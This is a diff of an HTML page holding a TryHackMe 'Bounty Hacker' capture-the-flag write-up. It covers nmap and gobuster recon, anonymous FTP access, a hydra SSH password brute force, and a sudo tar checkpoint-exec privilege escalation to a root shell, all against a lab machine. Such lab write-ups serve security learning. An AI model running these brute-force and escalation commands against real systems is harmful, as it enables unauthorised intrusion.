@@ -6,25 +6,24 @@
 <title>THM: Bounty Hacker</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.min.css" /> <script src="/src/copy-pre.min.js"></script> <script src="/src/theme-switcher.min.js" defer></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
-<div id="org-div-home-and-up">
- <a accesskey="h" href="./index.html"> UP </a>
- |
- <a accesskey="H" href="/index.html"> HOME </a>
-</div><div id="content" class="content">
+<div id="preamble" class="status">
+<div id="org-div-home-and-up"><a accesskey="H" href="/index.html"> HOME </a> | <button id="theme-toggle" title="Toggle theme">🌓</button></div>
+</div>
+<div id="content" class="content">
 <h1 class="title">THM: Bounty Hacker</h1>
 <div id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2d8576a">Recon</a></li>
-<li><a href="#orge8ef69e">The Website</a></li>
-<li><a href="#orgc7db063">The FTP server</a></li>
-<li><a href="#orga15193d">The SSH server</a></li>
-<li><a href="#org132da34">Privilege Escalation</a></li>
-<li><a href="#orgd781d48">Conclusion</a></li>
+<li><a href="#orgebc27c6">Recon</a></li>
+<li><a href="#orga0428c7">The Website</a></li>
+<li><a href="#orgd6033f9">The FTP server</a></li>
+<li><a href="#orgdd0d01c">The SSH server</a></li>
+<li><a href="#orgf329a22">Privilege Escalation</a></li>
+<li><a href="#org93b79f4">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -44,16 +43,14 @@ boring at times.
 That&rsquo;s the reason why I now am here (even though I suppose that taking
 on a medium difficulty room instead of an easy one would be better)!
 </p>
-
-
-<div id="outline-container-org2d8576a" class="outline-2">
-<h2 id="org2d8576a"><a href="#org2d8576a">Recon</a></h2>
-<div class="outline-text-2" id="text-org2d8576a">
+<div id="outline-container-orgebc27c6" class="outline-2">
+<h2 id="orgebc27c6"><a href="#orgebc27c6">Recon</a></h2>
+<div class="outline-text-2" id="text-orgebc27c6">
 <p>
 Like always: a quick <code>nmap</code> scan
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org9cf8b5d"><span class="org-variable-name">IP</span>=10.10.61.63
+<pre class="src src-bash" id="orgf44f2f0"><span class="org-variable-name">IP</span>=10.10.61.63
 nmap -sV -sC -oN nmap.initial $<span class="org-variable-name">IP</span>
 </pre>
 </div>
@@ -73,15 +70,14 @@ missed anything, we visit the website.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orge31c35c">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
+<pre class="src src-bash" id="org780bc5c">nmap -p- -oN nmap.full -T4 $<span class="org-variable-name">IP</span>
 </pre>
 </div>
 </div>
 </div>
-
-<div id="outline-container-orge8ef69e" class="outline-2">
-<h2 id="orge8ef69e"><a href="#orge8ef69e">The Website</a></h2>
-<div class="outline-text-2" id="text-orge8ef69e">
+<div id="outline-container-orga0428c7" class="outline-2">
+<h2 id="orga0428c7"><a href="#orga0428c7">The Website</a></h2>
+<div class="outline-text-2" id="text-orga0428c7">
 <p>
 First things first, after visiting the website it looks like its a
 simple static website, comprised of just one html page, in which
@@ -93,16 +89,14 @@ getting into the target system to us. Nothing is hidden in the html.
 Gobuster also did not reveal any promising files.
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org1623d8c">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
+<pre class="src src-bash" id="orgbc78dfc">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.61.63
 </pre>
 </div>
 </div>
 </div>
-
-
-<div id="outline-container-orgc7db063" class="outline-2">
-<h2 id="orgc7db063"><a href="#orgc7db063">The FTP server</a></h2>
-<div class="outline-text-2" id="text-orgc7db063">
+<div id="outline-container-orgd6033f9" class="outline-2">
+<h2 id="orgd6033f9"><a href="#orgd6033f9">The FTP server</a></h2>
+<div class="outline-text-2" id="text-orgd6033f9">
 <p>
 Using the standard command we can visit the ftp server as <code>anonymous</code>.
 </p>
@@ -110,7 +104,7 @@ Using the standard command we can visit the ftp server as <code>anonymous</code>
 <p>
 If performing any commands returns:
 </p>
-<pre class="example" id="org4b3940c">
+<pre class="example" id="org55e67c1">
 530 Please login with USER and PASS.
 </pre>
 <p>
@@ -130,16 +124,15 @@ small <i>flag</i></li>
 </ul>
 </div>
 </div>
-
-<div id="outline-container-orga15193d" class="outline-2">
-<h2 id="orga15193d"><a href="#orga15193d">The SSH server</a></h2>
-<div class="outline-text-2" id="text-orga15193d">
+<div id="outline-container-orgdd0d01c" class="outline-2">
+<h2 id="orgdd0d01c"><a href="#orgdd0d01c">The SSH server</a></h2>
+<div class="outline-text-2" id="text-orgdd0d01c">
 <p>
 Trying our luck with the wordlist found above, eventually gives us the
 password for the user <code>lin</code>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgf050e7d">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
+<pre class="src src-bash" id="org365348a">hydra -l lin -P locks.txt ssh://$<span class="org-variable-name">IP</span> -t 1
 </pre>
 </div>
 
@@ -149,11 +142,9 @@ machine, and by visiting lin&rsquo;s Desktop, we get the first actual flag.
 </p>
 </div>
 </div>
-
-
-<div id="outline-container-org132da34" class="outline-2">
-<h2 id="org132da34"><a href="#org132da34">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-org132da34">
+<div id="outline-container-orgf329a22" class="outline-2">
+<h2 id="orgf329a22"><a href="#orgf329a22">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-orgf329a22">
 <p>
 Just running <code>sudo -l</code> shows that we can run <code>/bin/tar</code> as root.
 </p>
@@ -164,16 +155,14 @@ privileges in no time:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org5152a26">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
+<pre class="src src-bash" id="org7c68b46">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="org-variable-name">exec</span>=/bin/sh
 </pre>
 </div>
 </div>
 </div>
-
-
-<div id="outline-container-orgd781d48" class="outline-2">
-<h2 id="orgd781d48"><a href="#orgd781d48">Conclusion</a></h2>
-<div class="outline-text-2" id="text-orgd781d48">
+<div id="outline-container-org93b79f4" class="outline-2">
+<h2 id="org93b79f4"><a href="#org93b79f4">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org93b79f4">
 <p>
 It was a nice room, arguably a wrong choice for me, but a good place
 to start I suppose, covering a little bit of the basics. 
